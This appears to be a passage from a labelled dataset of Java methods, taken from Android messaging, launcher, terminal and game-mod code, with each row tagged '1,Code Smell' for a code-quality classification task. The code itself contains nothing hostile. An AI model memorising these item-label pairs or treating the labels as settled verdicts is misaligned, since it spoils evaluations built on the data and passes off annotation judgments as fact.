    if (consent == CtrlPermissions.ConsentType.ALLOW) {
      processRequest(intent,action);
      return;
    }
 else     if (consent == CtrlPermissions.ConsentType.DENY) {
      abort();
      return;
    }
  }
  if (isControlApp(action)) {
    processRequest(intent,action);
    return;
  }
  findViewById(R.id.allow_btn).setOnClickListener(v -> controlAction(intent,action,true));
  findViewById(R.id.deny_btn).setOnClickListener(v -> controlAction(intent,action,false));
  if (app != null) {
    ((TextView)findViewById(R.id.app_name)).setText(app.getName());
    ((TextView)findViewById(R.id.app_package)).setText(app.getPackageName());
    ((ImageView)findViewById(R.id.app_icon)).setImageDrawable(app.getIcon());
  }
 else   findViewById(R.id.caller_app).setVisibility(View.GONE);
  new Handler(Looper.getMainLooper()).postDelayed(() -> {
    Button btn=findViewById(R.id.allow_btn);
    btn.setTextColor(0xFF0099CC);
    btn.setEnabled(true);
  }
,1500);
}",1,Code Smell
"public String getSystemAnomalyMessage(boolean ignoreNavmodeChangeStates,boolean ignoreOnlySystemUiViews){
  try {
{
      final StringBuilder sb=new StringBuilder();
      UiObject2 object=mDevice.findObject(By.res(""android"",""alertTitle"").pkg(""android""));
      if (object != null) {
        sb.append(""TITLE: "").append(object.getText());
      }
      object=mDevice.findObject(By.res(""android"",""message"").pkg(""android""));
      if (object != null) {
        sb.append("" PACKAGE: "").append(object.getApplicationPackage()).append("" MESSAGE: "").append(object.getText());
      }
      if (sb.length() != 0) {
        return ""System alert popup is visible: "" + sb;
      }
    }
    if (hasSystemUiObject(""keyguard_status_view""))     return ""Phone is locked"";
    if (!ignoreOnlySystemUiViews) {
      final String visibleApps=mDevice.findObjects(getAnyObjectSelector()).stream().map(LauncherInstrumentation::getApplicationPackageSafe).distinct().filter(pkg -> pkg != null).collect(Collectors.joining("",""));
      if (SYSTEMUI_PACKAGE.equals(visibleApps))       return ""Only System UI views are visible"";
    }
    if (!ignoreNavmodeChangeStates) {
      if (!mDevice.wait(Until.hasObject(getAnyObjectSelector()),WAIT_TIME_MS)) {
        return ""Screen is empty"";
      }
    }
    final String navigationModeError=getNavigationModeMismatchError(true);
    if (navigationModeError != null)     return navigationModeError;
  }
 catch (  Throwable e) {
    Log.w(TAG,""getSystemAnomalyMessage failed"",e);
  }
  return null;
}",1,Code Smell
"public void createTaskForSecretChat(int chatId,int time,int readTime,int isOut,ArrayList<Long> random_ids){
  storageQueue.postRunnable(() -> {
    SQLiteCursor cursor=null;
    SQLitePreparedStatement state=null;
    try {
      long dialogId=DialogObject.makeEncryptedDialogId(chatId);
      int minDate=Integer.MAX_VALUE;
      SparseArray<ArrayList<Integer>> messages=new SparseArray<>();
      ArrayList<Integer> midsArray=new ArrayList<>();
      StringBuilder mids=new StringBuilder();
      if (random_ids == null) {
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT mid, ttl FROM messages_v2 WHERE uid = %d AND out = %d AND read_state > 0 AND ttl > 0 AND date <= %d AND send_state = 0 AND media != 1"",dialogId,isOut,time));
      }
 else {
        String ids=TextUtils.join("","",random_ids);
        cursor=database.queryFinalized(String.format(Locale.US,""SELECT m.mid, m.ttl FROM messages_v2 as m INNER JOIN randoms_v2 as r ON m.mid = r.mid AND m.uid = r.uid WHERE r.random_id IN (%s)"",ids));
      }
      while (cursor.next()) {
        int ttl=cursor.intValue(1);
        int mid=cursor.intValue(0);
        if (random_ids != null) {
          midsArray.add(mid);
        }
        if (ttl <= 0) {
          continue;
        }
        int date=Math.max(time,readTime) + ttl;
        minDate=Math.min(minDate,date);
        ArrayList<Integer> arr=messages.get(date);
        if (arr == null) {
          arr=new ArrayList<>();
          messages.put(date,arr);
        }
        if (mids.length() != 0) {
          mids.append("","");
        }
        mids.append(mid);
        arr.add(mid);
      }
      cursor.dispose();
      cursor=null;
      if (random_ids != null) {
        AndroidUtilities.runOnUIThread(() -> {
          markMessagesContentAsRead(dialogId,midsArray,0);
          getNotificationCenter().postNotificationName(NotificationCenter.messagesReadContent,dialogId,midsArray);
        }
);
      }
      if (messages.size() != 0) {
        database.beginTransaction();
        state=database.executeFast(""REPLACE INTO enc_tasks_v4 VALUES(?, ?, ?, ?)"");
        for (int a=0; a < messages.size(); a++) {
          int key=messages.keyAt(a);
          ArrayList<Integer> arr=messages.get(key);
          for (int b=0; b < arr.size(); b++) {
            state.requery();
            state.bindInteger(1,arr.get(b));
            state.bindLong(2,dialogId);
            state.bindInteger(3,key);
            state.bindInteger(4,0);
            state.step();
          }
        }
        state.dispose();
        state=null;
        database.commitTransaction();
        database.executeFast(String.format(Locale.US,""UPDATE messages_v2 SET ttl = 0 WHERE mid IN(%s) AND uid = %d"",mids.toString(),dialogId)).stepThis().dispose();
        getMessagesController().didAddedNewTask(minDate,dialogId,messages);
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (database != null) {
        database.commitTransaction();
      }
      if (state != null) {
        state.dispose();
      }
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
);
}",1,Code Smell
"public int recountMixesDone(Wallet postmixWallet,BlockTransactionHashIndex postmixUtxo){
  int mixesDone=0;
  Set<BlockTransactionHashIndex> walletTxos=postmixWallet.getWalletTxos().entrySet().stream().filter(entry -> entry.getValue().getKeyPurpose() == KeyPurpose.RECEIVE).map(Map.Entry::getKey).collect(Collectors.toSet());
  BlockTransaction blkTx=postmixWallet.getTransactions().get(postmixUtxo.getHash());
  while (blkTx != null) {
    mixesDone++;
    List<TransactionInput> inputs=blkTx.getTransaction().getInputs();
    blkTx=null;
    for (    TransactionInput txInput : inputs) {
      BlockTransaction inputTx=postmixWallet.getTransactions().get(txInput.getOutpoint().getHash());
      if (inputTx != null && walletTxos.stream().anyMatch(txo -> txo.getHash().equals(inputTx.getHash()) && txo.getIndex() == txInput.getOutpoint().getIndex()) && inputTx.getTransaction() != null) {
        blkTx=inputTx;
      }
    }
  }
  return mixesDone;
}",1,Code Smell
"public Pair<Set<ClassNode>,Set<InterfaceNode>> getAllChildren(boolean includeSelf){
  Set<ClassNode> classNodes=new HashSet<>();
  Set<InterfaceNode> itfNodes=new HashSet<>();
  Set<Node> handleQ=new HashSet<>();
  if (this instanceof ClassNode) {
    ClassNode node=(ClassNode)this;
    if (includeSelf) {
      classNodes.add(node);
    }
    handleQ.addAll(node.children);
  }
 else   if (this instanceof InterfaceNode) {
    InterfaceNode node=(InterfaceNode)this;
    if (includeSelf) {
      itfNodes.add(node);
    }
    handleQ.addAll(node.children);
    handleQ.addAll(node.implementedClasses);
  }
  while (!handleQ.isEmpty()) {
    Iterator<Node> iterator=handleQ.iterator();
    Node next=iterator.next();
    iterator.remove();
    if (next instanceof ClassNode) {
      ClassNode node=(ClassNode)next;
      classNodes.add(node);
      for (      ClassNode c : node.children) {
        if (!classNodes.contains(c)) {
          handleQ.add(c);
        }
      }
    }
 else     if (next instanceof InterfaceNode) {
      InterfaceNode node=(InterfaceNode)next;
      itfNodes.add(node);
      for (      ClassNode c : node.implementedClasses) {
        if (!classNodes.contains(c)) {
          handleQ.add(c);
        }
      }
      for (      InterfaceNode c : node.children) {
        if (!itfNodes.contains(c)) {
          handleQ.add(c);
        }
      }
    }
  }
  return new Pair<>(classNodes,itfNodes);
}
",1,Code Smell
"private void setupConferenceMainView(){
  DisplayMetrics dm=getResources().getDisplayMetrics();
  int height=Math.max(dm.heightPixels,dm.widthPixels);
  int width=Math.min(dm.widthPixels,dm.heightPixels);
  previewContainerFrameLayout.removeAllViews();
  List<AVEngineKit.ParticipantProfile> mainProfiles=new ArrayList<>();
  mainProfiles.add(myProfile);
  if (focusProfile != null && !focusProfile.getUserId().equals(myProfile.getUserId())) {
    mainProfiles.add(focusProfile);
  }
  for (  AVEngineKit.ParticipantProfile profile : mainProfiles) {
    ConferenceParticipantItemView conferenceItem;
    if (profile.isAudience() || profile.isVideoMuted()) {
      conferenceItem=new ConferenceParticipantItemView(getContext());
    }
 else {
      conferenceItem=new ConferenceParticipantItemVideoView(getContext());
      ((ConferenceParticipantItemVideoView)conferenceItem).setEnableVideoZoom(true);
    }
    conferenceItem.setOnClickListener(clickListener);
    conferenceItem.setup(this.callSession,profile);
    if (profile.getUserId().equals(ChatManager.Instance().getUserId())) {
      myParticipantItemView=conferenceItem;
    }
 else {
      focusParticipantItemView=conferenceItem;
    }
    if (focusProfile != null && !focusProfile.getUserId().equals(myProfile.getUserId())) {
      if (profile.getUserId().equals(ChatManager.Instance().getUserId())) {
        previewContainerFrameLayout.removeAllViews();
        conferenceItem.setLayoutParams(new ViewGroup.LayoutParams(width / 3,height / 4));
        previewContainerFrameLayout.addView(conferenceItem);
        conferenceItem.setBackgroundResource(R.color.gray0_half_transparent);
        SurfaceView focusSurfaceView=conferenceItem.findViewWithTag(""sv_"" + profile.getUserId());
        if (focusSurfaceView != null) {
          focusSurfaceView.setZOrderMediaOverlay(true);
        }
      }
 else {
        focusContainerFrameLayout.removeAllViews();
        conferenceItem.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT));
        focusContainerFrameLayout.addView(conferenceItem);
        if (!profile.isAudience() && !profile.isVideoMuted()) {
          this.callSession.setParticipantVideoType(focusProfile.getUserId(),focusProfile.isScreenSharing(),AVEngineKit.VideoType.VIDEO_TYPE_BIG_STREAM);
        }
      }
    }
 else {
      previewContainerFrameLayout.removeAllViews();
      focusContainerFrameLayout.removeAllViews();
      conferenceItem.setLayoutParams(new FrameLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT));
      focusContainerFrameLayout.addView(conferenceItem);
    }
  }
}",1,Code Smell
"public void toggleHidden(long dialogId,boolean hide,boolean request,boolean notify){
  ArrayList<TL_stories.PeerStories> removeFrom;
  ArrayList<TL_stories.PeerStories> insertTo;
  boolean remove=true;
  if (hide) {
    removeFrom=dialogListStories;
    insertTo=hiddenListStories;
  }
 else {
    removeFrom=hiddenListStories;
    insertTo=dialogListStories;
  }
  TL_stories.PeerStories removed=null;
  for (int i=0; i < removeFrom.size(); i++) {
    if (DialogObject.getPeerDialogId(removeFrom.get(i).peer) == dialogId) {
      if (remove) {
        removed=removeFrom.remove(i);
      }
 else {
        removed=removeFrom.get(i);
      }
      break;
    }
  }
  if (removed != null) {
    boolean found=false;
    for (int i=0; i < insertTo.size(); i++) {
      if (DialogObject.getPeerDialogId(insertTo.get(i).peer) == dialogId) {
        found=true;
        break;
      }
    }
    if (!found) {
      insertTo.add(0,removed);
      AndroidUtilities.cancelRunOnUIThread(sortStoriesRunnable);
      sortStoriesRunnable.run();
    }
  }
  if (notify) {
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.storiesUpdated);
  }
  MessagesController.getInstance(currentAccount).checkArchiveFolder();
  if (request) {
    if (dialogId >= 0) {
      TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(dialogId);
      user.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(Collections.singletonList(user),null,false,true);
      MessagesController.getInstance(currentAccount).putUser(user,false);
    }
 else {
      TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-dialogId);
      chat.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(null,Collections.singletonList(chat),false,true);
      MessagesController.getInstance(currentAccount).putChat(chat,false);
    }
    TL_stories.TL_stories_togglePeerStoriesHidden req=new TL_stories.TL_stories_togglePeerStoriesHidden();
    req.peer=MessagesController.getInstance(currentAccount).getInputPeer(dialogId);
    req.hidden=hide;
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    }
);
  }
}",1,Code Smell
"/** 
 * Processes a single block.
 * @param blockIndex {@code >= 0;} block index of the block to process
 */
private void processBlock(int blockIndex){
  RegisterSpecSet primaryState=resultInfo.mutableCopyOfStarts(blockIndex);
  SsaBasicBlock block=blocks.get(blockIndex);
  List<SsaInsn> insns=block.getInsns();
  int insnSz=insns.size();
  if (blockIndex == method.getExitBlockIndex()) {
    return;
  }
  SsaInsn lastInsn=insns.get(insnSz - 1);
  boolean hasExceptionHandlers=lastInsn.getOriginalRopInsn().getCatches().size() != 0;
  boolean canThrowDuringLastInsn=hasExceptionHandlers && (lastInsn.getResult() != null);
  int freezeSecondaryStateAt=insnSz - 1;
  RegisterSpecSet secondaryState=primaryState;
  for (int i=0; i < insnSz; i++) {
    if (canThrowDuringLastInsn && (i == freezeSecondaryStateAt)) {
      primaryState.setImmutable();
      primaryState=primaryState.mutableCopy();
    }
    SsaInsn insn=insns.get(i);
    RegisterSpec result;
    result=insn.getLocalAssignment();
    if (result == null) {
      result=insn.getResult();
      if (result != null && primaryState.get(result.getReg()) != null) {
        primaryState.remove(primaryState.get(result.getReg()));
      }
      continue;
    }
    result=result.withSimpleType();
    RegisterSpec already=primaryState.get(result);
    if (!result.equals(already)) {
      RegisterSpec previous=primaryState.localItemToSpec(result.getLocalItem());
      if (previous != null && (previous.getReg() != result.getReg())) {
        primaryState.remove(previous);
      }
      resultInfo.addAssignment(insn,result);
      primaryState.put(result);
    }
  }
  primaryState.setImmutable();
  IntList successors=block.getSuccessorList();
  int succSz=successors.size();
  int primarySuccessor=block.getPrimarySuccessorIndex();
  for (int i=0; i < succSz; i++) {
    int succ=successors.get(i);
    RegisterSpecSet state=(succ == primarySuccessor) ? primaryState : secondaryState;
    if (resultInfo.mergeStarts(succ,state)) {
      workSet.set(succ);
    }
  }
}",1,Code Smell
"private void fillAccessObject(List<DataSourceAccess> list,DataSourceAccessSelector selector){
  if (BooleanUtils.isNotTrue(selector.getAccessObject())) {
    return;
  }
  List<Long> userIdList=Lists.newArrayList();
  List<Long> teamIdList=Lists.newArrayList();
  for (  DataSourceAccess data : list) {
    if (AccessObjectTypeEnum.TEAM.getCode().equals(data.getAccessObjectType())) {
      teamIdList.add(data.getAccessObjectId());
    }
 else     if (AccessObjectTypeEnum.USER.getCode().equals(data.getAccessObjectType())) {
      userIdList.add(data.getAccessObjectId());
    }
  }
  List<User> userList=userService.listQuery(userIdList).getData();
  Map<Long,User> userMap=EasyCollectionUtils.toIdentityMap(userList,User::getId);
  List<Team> teamList=teamService.listQuery(teamIdList).getData();
  Map<Long,Team> teamMap=EasyCollectionUtils.toIdentityMap(teamList,Team::getId);
  for (  DataSourceAccess data : list) {
    DataSourceAccessObject dataSourceAccessObject=data.getAccessObject();
    if (dataSourceAccessObject == null) {
      continue;
    }
    if (AccessObjectTypeEnum.TEAM.getCode().equals(data.getAccessObjectType())) {
      Team team=teamMap.get(data.getAccessObjectId());
      if (team == null) {
        continue;
      }
      dataSourceAccessObject.setCode(team.getCode());
      dataSourceAccessObject.setName(team.getName());
    }
 else     if (AccessObjectTypeEnum.USER.getCode().equals(data.getAccessObjectType())) {
      User user=userMap.get(data.getAccessObjectId());
      if (user == null) {
        continue;
      }
      dataSourceAccessObject.setCode(user.getUserName());
      dataSourceAccessObject.setName(user.getNickName());
    }
  }
}
",1,Code Smell
"protected void onTerminalExtraKeyButtonClick(View view,String key,boolean ctrlDown,boolean altDown,boolean shiftDown,boolean fnDown){
  if (PRIMARY_KEY_CODES_FOR_STRINGS.containsKey(key)) {
    Integer keyCode=PRIMARY_KEY_CODES_FOR_STRINGS.get(key);
    if (keyCode == null)     return;
    int metaState=0;
    if (ctrlDown)     metaState|=KeyEvent.META_CTRL_ON | KeyEvent.META_CTRL_LEFT_ON;
    if (altDown)     metaState|=KeyEvent.META_ALT_ON | KeyEvent.META_ALT_LEFT_ON;
    if (shiftDown)     metaState|=KeyEvent.META_SHIFT_ON | KeyEvent.META_SHIFT_LEFT_ON;
    if (fnDown)     metaState|=KeyEvent.META_FUNCTION_ON;
    KeyEvent keyEvent=new KeyEvent(0,0,KeyEvent.ACTION_UP,keyCode,0,metaState);
    mTerminalView.onKeyDown(keyCode,keyEvent);
  }
 else {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
      key.codePoints().forEach(codePoint -> {
        mTerminalView.inputCodePoint(TerminalView.KEY_EVENT_SOURCE_VIRTUAL_KEYBOARD,codePoint,ctrlDown,altDown);
      }
);
    }
 else {
      TerminalSession session=mTerminalView.getCurrentSession();
      if (session != null && key.length() > 0)       session.write(key);
    }
  }
}",1,Code Smell
"/** 
 * 加载参数类型
 * @param subscriber
 * @param method
 * @return
 */
private List<InjectParam> loadParamType(Subscriber subscriber,Method method){
  if (subscriber == null) {
    return null;
  }
  Param[] params=subscriber.value();
  if (params.length == 0) {
    return null;
  }
  Class<?>[] defineParams=method.getParameterTypes();
  Class<?> realParam;
  if (defineParams.length != 1) {
    if (defineParams.length == 0) {
      realParam=Void.class;
    }
 else {
      return null;
    }
  }
 else {
    realParam=defineParams[0];
    if (realParam.isPrimitive()) {
      realParam=Const.getPackedType(realParam);
    }
  }
  List<InjectParam> paramTypes=new ArrayList<>();
  for (  Param param : params) {
    if (param.type() != Void.class) {
      if (realParam != null && !realParam.isAssignableFrom(param.type())) {
        LogUtil.e(TAG,""Param参数与方法参数不一致，无法注册Param【%s】, Method【%s】"",param,method);
        continue;
      }
      InjectParam paramType=InjectParam.newInjectParamType(param.value(),param.type(),param.sticky(),param.persistent());
      if (paramType != null) {
        paramTypes.add(paramType);
      }
    }
 else     if (realParam != null) {
      InjectParam paramType=InjectParam.newInjectParamType(param.value(),realParam,param.sticky(),param.persistent());
      if (paramType != null) {
        paramTypes.add(paramType);
      }
    }
 else {
      LogUtil.e(TAG,""无法解析Provider【%s】"",param);
    }
  }
  if (paramTypes.size() == 0) {
    return null;
  }
  return paramTypes;
}",1,Code Smell
"protected void searchXml(final Element node,String keyword){
  String[] fs=keyword.split(""\\."");
  String current_keyword=fs[0];
  String attr_name=null;
  String new_keyword=null;
  if (current_keyword.contains(""#"")) {
    attr_name=current_keyword.split(""#"")[1];
    current_keyword=current_keyword.split(""#"")[0];
  }
  if (fs.length != 1) {
    new_keyword=keyword.replace(current_keyword + ""."","""");
  }
 else {
    new_keyword=current_keyword;
  }
  if (node.getName().equals(current_keyword)) {
    if (attr_name != null) {
      final List<Attribute> listAttr=node.attributes();
      for (      final Attribute attr : listAttr) {
        if (attr.getName().equals(attr_name)) {
          result.add(attr.getValue());
        }
      }
      return;
    }
    if (fs.length == 1) {
      result.add(node.getTextTrim());
    }
 else {
      final List<Element> listElement=node.elements();
      for (      final Element e : listElement) {
        searchXml(e,new_keyword);
      }
    }
  }
 else {
    final List<Element> listElement=node.elements();
    for (    final Element e : listElement) {
      searchXml(e,keyword);
    }
  }
}",1,Code Smell
"public void markMessageAsRead2(long dialogId,int mid,TLRPC.InputChannel inputChannel,int ttl,long taskId){
  markMessageAsRead2(dialogId,mid,inputChannel,ttl,taskId,true);
}
public void markMessageAsRead2(long dialogId,int mid,TLRPC.InputChannel inputChannel,int ttl,long taskId,boolean createDeleteTask){
  if (mid == 0 || ttl < 0) {
    return;
  }
  if (DialogObject.isChatDialog(dialogId) && inputChannel == null) {
    inputChannel=getInputChannel(dialogId);
    if (inputChannel == null) {
      return;
    }
  }
  long newTaskId;
  if (taskId == 0) {
    NativeByteBuffer data=null;
    try {
      data=new NativeByteBuffer(20 + (inputChannel != null ? inputChannel.getObjectSize() : 0));
      data.writeInt32(createDeleteTask ? 23 : 101);
      data.writeInt64(dialogId);
      data.writeInt32(mid);
      data.writeInt32(ttl);
      if (inputChannel != null) {
        inputChannel.serializeToStream(data);
      }
    }
 catch (    Exception e) {
      FileLog.e(e);
    }
    newTaskId=getMessagesStorage().createPendingTask(data);
  }
 else {
    newTaskId=taskId;
  }
  int time=getConnectionsManager().getCurrentTime();
  if (createDeleteTask) {
    getMessagesStorage().createTaskForMid(dialogId,mid,time,time,ttl,false);
  }
  if (inputChannel != null) {
    TLRPC.TL_channels_readMessageContents req=new TLRPC.TL_channels_readMessageContents();
    req.channel=inputChannel;
    req.id.add(mid);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (newTaskId != 0) {
        getMessagesStorage().removePendingTask(newTaskId);
      }
    }
);
  }
 else {
    TLRPC.TL_messages_readMessageContents req=new TLRPC.TL_messages_readMessageContents();
    req.id.add(mid);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (error == null) {
        TLRPC.TL_messages_affectedMessages res=(TLRPC.TL_messages_affectedMessages)response;
        processNewDifferenceParams(-1,res.pts,-1,res.pts_count);
      }
      if (newTaskId != 0) {
        getMessagesStorage().removePendingTask(newTaskId);
      }
    }
);
  }
}",1,Code Smell
"public Collection<double[]> getIntersection(TrackNode node1,TrackNode node2,TrackEdge other,TrackNode other1,TrackNode other2){
  Vec3 v1=node1.location.getLocation();
  Vec3 v2=node2.location.getLocation();
  Vec3 w1=other1.location.getLocation();
  Vec3 w2=other2.location.getLocation();
  if (isInterDimensional() || other.isInterDimensional())   return Collections.emptyList();
  if (v1.y != v2.y || v1.y != w1.y || v1.y != w2.y)   return Collections.emptyList();
  if (!isTurn()) {
    if (!other.isTurn())     return ImmutableList.of(VecHelper.intersectRanged(v1,w1,v2,w2,Axis.Y));
    return other.getIntersection(other1,other2,this,node1,node2).stream().map(a -> new double[]{a[1],a[0]}).toList();
  }
  AABB bb=turn.getBounds();
  if (!other.isTurn()) {
    if (!bb.intersects(w1,w2))     return Collections.emptyList();
    Vec3 seg1=v1;
    Vec3 seg2=null;
    double t=0;
    Collection<double[]> intersections=new ArrayList<>();
    for (int i=0; i < turn.getSegmentCount(); i++) {
      double tOffset=t;
      t+=.5;
      seg2=getPosition(null,t / getLength());
      double[] intersection=VecHelper.intersectRanged(seg1,w1,seg2,w2,Axis.Y);
      seg1=seg2;
      if (intersection == null)       continue;
      intersection[0]+=tOffset;
      intersections.add(intersection);
    }
    return intersections;
  }
  if (!bb.intersects(other.turn.getBounds()))   return Collections.emptyList();
  Vec3 seg1=v1;
  Vec3 seg2=null;
  double t=0;
  Collection<double[]> intersections=new ArrayList<>();
  for (int i=0; i < turn.getSegmentCount(); i++) {
    double tOffset=t;
    t+=.5;
    seg2=getPosition(null,t / getLength());
    Vec3 otherSeg1=w1;
    Vec3 otherSeg2=null;
    double u=0;
    for (int j=0; j < other.turn.getSegmentCount(); j++) {
      double uOffset=u;
      u+=.5;
      otherSeg2=other.getPosition(null,u / other.getLength());
      double[] intersection=VecHelper.intersectRanged(seg1,otherSeg1,seg2,otherSeg2,Axis.Y);
      otherSeg1=otherSeg2;
      if (intersection == null)       continue;
      intersection[0]+=tOffset;
      intersection[1]+=uOffset;
      intersections.add(intersection);
    }
    seg1=seg2;
  }
  return intersections;
}",1,Code Smell
"public void start(final long logRetentionDays){
  if (logRetentionDays < 3) {
    return;
  }
  localThread=new Thread(() -> {
    while (!toStop) {
      try {
        File[] childDirs=new File(JobFileAppender.getLogPath()).listFiles();
        if (childDirs != null && childDirs.length > 0) {
          Calendar todayCal=Calendar.getInstance();
          todayCal.set(Calendar.HOUR_OF_DAY,0);
          todayCal.set(Calendar.MINUTE,0);
          todayCal.set(Calendar.SECOND,0);
          todayCal.set(Calendar.MILLISECOND,0);
          Date todayDate=todayCal.getTime();
          for (          File childFile : childDirs) {
            if (!childFile.isDirectory() || childFile.getName().indexOf(""-"") == -1) {
              continue;
            }
            Date logFileCreateDate=null;
            try {
              SimpleDateFormat simpleDateFormat=new SimpleDateFormat(""yyyy-MM-dd"");
              logFileCreateDate=simpleDateFormat.parse(childFile.getName());
            }
 catch (            ParseException e) {
              logger.error(e.getMessage(),e);
            }
            if (logFileCreateDate == null) {
              continue;
            }
            if ((todayDate.getTime() - logFileCreateDate.getTime()) >= logRetentionDays * (24 * 60 * 60* 1000)) {
              FileUtil.deleteRecursively(childFile);
            }
          }
        }
      }
 catch (      Exception e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
      try {
        TimeUnit.DAYS.sleep(1);
      }
 catch (      InterruptedException e) {
        if (!toStop) {
          logger.error(e.getMessage(),e);
        }
      }
    }
    logger.info("">>>>>>>>>>> datax-web, executor JobLogFileCleanThread thread destory."");
  }
);
  localThread.setDaemon(true);
  localThread.setName(""datax-web, executor JobLogFileCleanThread"");
  localThread.start();
}",1,Code Smell
"public void invalidateTransforms(){
  invalidateTransforms(true);
}
public void invalidateTransforms(boolean applyBackScaleY){
  if (lastToProgress != toProgress || lastTransitionProgress != transitionProgress) {
    if (!onSwipeBackProgressListeners.isEmpty()) {
      for (int i=0; i < onSwipeBackProgressListeners.size(); i++) {
        onSwipeBackProgressListeners.get(i).onSwipeBackProgress(this,toProgress,transitionProgress);
      }
    }
    lastToProgress=toProgress;
    lastTransitionProgress=transitionProgress;
  }
  View backgroundView=getChildAt(0);
  View foregroundView=null;
  if (currentForegroundIndex >= 0 && currentForegroundIndex < getChildCount()) {
    foregroundView=getChildAt(currentForegroundIndex);
  }
  backgroundView.setTranslationX(-transitionProgress * getWidth() * 0.5f);
  float bSc=0.95f + (1f - transitionProgress) * 0.05f;
  backgroundView.setScaleX(bSc);
  backgroundView.setScaleY(bSc);
  if (foregroundView != null) {
    foregroundView.setTranslationX((1f - transitionProgress) * getWidth());
  }
  invalidateVisibility();
  float fW=backgroundView.getMeasuredWidth(), fH=backgroundView.getMeasuredHeight();
  float tW=0;
  float tH=0;
  if (foregroundView != null) {
    tW=foregroundView.getMeasuredWidth();
    tH=overrideForegroundHeight != 0 ? overrideForegroundHeight : foregroundView.getMeasuredHeight();
  }
  if (backgroundView.getMeasuredWidth() == 0 || backgroundView.getMeasuredHeight() == 0) {
    return;
  }
  ActionBarPopupWindow.ActionBarPopupWindowLayout p=(ActionBarPopupWindow.ActionBarPopupWindowLayout)getParent();
  float w=fW + (tW - fW) * transitionProgress;
  float h=fH + (tH - fH) * transitionProgress;
  w+=p.getPaddingLeft() + p.getPaddingRight();
  h+=p.getPaddingTop() + p.getPaddingBottom();
  p.updateAnimation=false;
  p.setBackScaleX(w / p.getMeasuredWidth());
  if (applyBackScaleY) {
    p.setBackScaleY(Math.min(1,h / p.getMeasuredHeight()));
  }
  p.updateAnimation=true;
  for (int i=0; i < getChildCount(); i++) {
    View ch=getChildAt(i);
    ch.setPivotX(0);
    ch.setPivotY(0);
  }
  invalidate();
}",1,Code Smell
"public static Object invokeVirtual(Object obj,String name,Object... argsTypesAndReturnType) throws ReflectiveOperationException {
  Class clazz=obj.getClass();
  int argc=argsTypesAndReturnType.length / 2;
  Class[] argt=new Class[argc];
  Object[] argv=new Object[argc];
  Class returnType=null;
  if (argc * 2 + 1 == argsTypesAndReturnType.length) {
    returnType=(Class)argsTypesAndReturnType[argsTypesAndReturnType.length - 1];
  }
  int i, ii;
  Method[] m;
  Method method=null;
  Class[] _argt;
  for (i=0; i < argc; i++) {
    argt[i]=(Class)argsTypesAndReturnType[argc + i];
    argv[i]=argsTypesAndReturnType[i];
  }
  loop_main:   do {
    m=clazz.getDeclaredMethods();
    loop:     for (i=0; i < m.length; i++) {
      if (m[i].getName().equals(name)) {
        _argt=m[i].getParameterTypes();
        if (_argt.length == argt.length) {
          for (ii=0; ii < argt.length; ii++) {
            if (!argt[ii].equals(_argt[ii])) {
              continue loop;
            }
          }
          if (returnType != null && !returnType.equals(m[i].getReturnType())) {
            continue;
          }
          method=m[i];
          break loop_main;
        }
      }
    }
  }
 while (!Object.class.equals(clazz=clazz.getSuperclass()));
  if (method == null) {
    throw new NoSuchMethodException(name + paramsTypesToString(argt) + "" in ""+ obj.getClass().getName());
  }
  method.setAccessible(true);
  return method.invoke(obj,argv);
}",1,Code Smell
"/** 
 * Returns whether  {@code rowType} contains more than one star column orfields with the same name, which implies ambiguous column. 
 */
private boolean hasAmbiguousField(RelDataType rowType,RelDataTypeField field,String columnName,SqlNameMatcher nameMatcher){
  if (field.isDynamicStar() && !DynamicRecordType.isDynamicStarColName(columnName)) {
    int count=0;
    for (    RelDataTypeField possibleStar : rowType.getFieldList()) {
      if (possibleStar.isDynamicStar()) {
        if (++count > 1) {
          return true;
        }
      }
    }
  }
 else {
    int count=0;
    for (    RelDataTypeField f : rowType.getFieldList()) {
      if (Util.matches(nameMatcher.isCaseSensitive(),f.getName(),columnName)) {
        count++;
      }
    }
    if (count > 1) {
      return true;
    }
  }
  return false;
}",1,Code Smell
"@Override public Collection<BlockPos> addToGlobalPositions(LevelAccessor world,BlockPos targetPos,Direction targetFace,Collection<BlockPos> affectedPositions,TerrainTools usedTool){
  boolean searchDiagonals=param1 == 0;
  boolean fuzzy=param2 == 0;
  boolean replace=usedTool != TerrainTools.Overlay;
  int searchRange=param0;
  Set<BlockPos> visited=new HashSet<>();
  List<BlockPos> frontier=new LinkedList<>();
  BlockState state=world.getBlockState(targetPos);
  List<BlockPos> offsets=new LinkedList<>();
  for (int x=-1; x <= 1; x++)   for (int y=-1; y <= 1; y++)   for (int z=-1; z <= 1; z++)   if (Math.abs(x) + Math.abs(y) + Math.abs(z) < 2 || searchDiagonals)   if (targetFace.getAxis().choose(x,y,z) == 0 || !surface)   offsets.add(new BlockPos(x,y,z));
  BlockPos startPos=replace ? targetPos : targetPos.relative(targetFace);
  frontier.add(startPos);
  while (!frontier.isEmpty()) {
    BlockPos currentPos=frontier.remove(0);
    if (visited.contains(currentPos))     continue;
    visited.add(currentPos);
    if (!currentPos.closerThan(startPos,searchRange))     continue;
    if (replace) {
      BlockState stateToReplace=world.getBlockState(currentPos);
      BlockState stateAboveStateToReplace=world.getBlockState(currentPos.relative(targetFace));
      if (stateToReplace.getDestroySpeed(world,currentPos) == -1)       continue;
      if (stateToReplace.getBlock() != state.getBlock() && !fuzzy)       continue;
      if (stateToReplace.canBeReplaced())       continue;
      if (BlockHelper.hasBlockSolidSide(stateAboveStateToReplace,world,currentPos.relative(targetFace),targetFace.getOpposite()) && surface)       continue;
      affectedPositions.add(currentPos);
